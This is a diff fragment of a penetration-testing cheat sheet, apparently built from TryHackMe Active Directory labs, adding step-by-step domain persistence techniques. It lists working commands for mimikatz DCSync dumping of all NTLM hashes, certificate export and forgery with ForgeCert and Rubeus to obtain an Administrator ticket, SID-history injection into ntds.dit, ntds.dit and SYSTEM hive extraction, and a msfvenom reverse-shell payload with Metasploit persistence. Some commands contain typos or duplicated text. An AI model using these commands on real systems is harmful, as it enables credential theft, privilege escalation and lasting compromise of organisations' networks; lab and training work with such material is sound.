+4. `misc::cmd`
+5. from the opened CMD, try `dir \\USERNAME\\C$`
+   - consider also to download psexec in the machine compromised for more access
+   - `psexec.exe \\USERNAME cmd.exe`
 
 
 #### Shadow copies
@@ -6981,8 +7496,70 @@ Process
 3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
 4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials
 
+#### Through Credentials
 
-#### <ins>Remote Desktop</ins>
+1. DCSync All with mimikatz
+   - `privilege::debug`
+   - `log <username>_dcdump.txt`
+   - `lsadump::dcsync /domain:za.tryhackme.loc /all`
+2. `cat <username>_dcdump.txt | grep "SAM Username"`
+3. `cat <username>_dcdump.txt | grep "Hash NTLM"`
+- You can also target only one user with the following command
+  - `lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>`
+  
+
+#### Through Certificates
+
+1. See certificates stored
+   - `crypto::certificates /systemstore:local_machine`
+2. Patch memory to make these keys exportable
+   - `crypto::capi`
+   - `crypto::cng`
+3. Export the certificates
+   - `crypto::certificates /systemstore:local_machine /export`
+4. Generate certificates
+   - `ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123`
+5. Use Rubeus to request a TGT using the certificate
+   - `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`
+6. Load the TGT to auth to DC, with mimikatz
+   - `kerberos::ptt administrator.kirbi`
+
+
+#### Trough SID History
+
+- If you need to fix SID history (ntds.dit)
+  https://github.com/MichaelGrafnetter/DSInternals
+1. Confirm that your user has no SID history
+   - `Get-ADUser <your ad username> -properties sidhistory,memberof`
+2. Get the SID of the Domain Admins
+   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
+3. Patch the ntds.dit file with DSInternals
+   - `Stop-Service -Name ntds -force`
+   - `Stop-Service -Name ntds -force`
+   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
+   - `Start-Service -Name ntds`
+   - `Restart-Service -Name NTDS`
+4. Exit and Log in, verify the SID history
+   - `Get-ADUser aaron.jones -Properties sidhistory`
+5. Test your Admin privileges
+   - `dir \\thmdc.za.tryhackme.loc\c$`
+   
+   
+#### Trough metasploit
+
+1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
+2. `use exploit/multi/handler`
+3. `set payload windows/meterpreter/reverse_tcp`
+4. after the shell is spawned: `background`
+5. `use exploit/windows/local/persistence`
+6. `set settion 1`
+7. `run`
+- If the session dies, just run again `run`
+- https://docs.rapid7.com/metasploit/about-post-exploitation/
+
+
+
+### <ins>Remote Desktop</ins>
 ```PowerShell
 # enable RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
